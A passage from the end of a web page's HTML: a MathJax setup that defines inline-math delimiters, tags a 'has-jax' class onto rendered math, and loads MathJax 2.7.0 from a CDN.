    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>